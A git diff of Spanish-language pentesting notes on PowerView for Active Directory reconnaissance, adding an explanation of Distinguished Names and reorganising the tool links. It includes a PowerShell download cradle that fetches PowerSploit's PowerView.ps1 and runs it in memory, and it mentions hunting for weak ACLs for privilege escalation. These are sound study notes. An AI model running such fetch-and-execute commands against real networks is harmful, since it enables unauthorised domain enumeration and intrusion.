@@ -1,11 +1,8 @@
 # PowerView
 
-Tags: #AD 
+Tags: #AD #PowerView
 
 PowerView, desarrollada por Will Schroeder, es una herramienta que utiliza la función de dominio de Windows para recopilar información sobre una red y sus usuarios. Todas las opciones de la herramienta envían solicitudes legítimas que pueden ejecutarse en el contexto de los derechos de un usuario de dominio.
-
-* [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
-* [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)
 
 ```bash 
 # Enumeracion con PowerView
@@ -21,11 +18,42 @@ PowerView, desarrollada por Will Schroeder, es una herramienta que utiliza la fu
 - Al inspeccionar ACLs, podrían descubrirse configuraciones que otorgan permisos de escritura a usuarios normales en directorios que no deberían, permitiendo posibles ataques de escalada de privilegios.
 ```
 
-# PowerView
+## Distinguished Namne o DN
+
+```bash 
+El término `'CN=Users,DC=domain1,DC=corp'` es un Nombre Distinguido (Distinguished Name o DN) en Active Directory (AD) de Microsoft, usado para identificar de manera única objetos dentro del directorio. Cada componente tiene un propósito específico:
+
+1. CN=Users
+    - 'CN' significa Common Name (Nombre Común).
+    - 'Users' es el nombre común del objeto. En este caso, se refiere al contenedor o unidad organizativa predeterminada donde se almacenan los objetos de usuario en un dominio de AD. Este contenedor 'Users' es un lugar común para encontrar cuentas de usuario predeterminadas y creadas por el usuario.
+        
+2. DC=domain1,DC=corp
+    - 'DC' significa Domain Component (Componente del Dominio).  
+    - 'domain1.corp' representa el nombre del dominio en el que se encuentra el objeto 'Users'. Este nombre de dominio está dividido en dos partes:
+        - `spartancybersec`: Sería el primer nivel o nombre distintivo del dominio. 
+        - `corp`: Es el sufijo del dominio, que suele indicar el tipo de organización o la naturaleza comercial del dominio (`corp` para corporativo, `com` para comercial, etc.).
+```
+
+```bash 
+# Uso y Significado en Active Directory
+
+- Identificación Única: En AD, cada objeto debe tener un DN único. Este DN proporciona una ruta clara para ubicar y gestionar el objeto dentro de la estructura jerárquica del directorio.
+    
+- Administración de Usuarios: El contenedor 'CN=Users' es significativo porque es donde generalmente se almacenan y gestionan las cuentas de usuario en un dominio. La gestión de estos objetos incluye operaciones como la creación, modificación, y eliminación de cuentas de usuario, así como la asignación de políticas y permisos.
+    
+- Búsqueda y Consulta LDAP: En operaciones de consulta LDAP (Lightweight Directory Access Protocol), los DNs son esenciales para localizar y manipular objetos dentro del directorio. Por ejemplo, al realizar búsquedas o aplicar configuraciones a través de scripts o herramientas de administración.
+    
+- Importancia en la Seguridad: Para un profesional de la ciberseguridad o un pentester, entender la estructura de DN es vital para la exploración y evaluación de la seguridad de un dominio de AD. Por ejemplo, al buscar cuentas de usuario con configuraciones inseguras o permisos excesivos.
+```
+
+## PowerView
+
+* [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
+* [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)
 
 ```powershell
 # Descargar el binario desde un repositorio 
-❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
+❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');
 ```
 
 ## Quick enumeration 
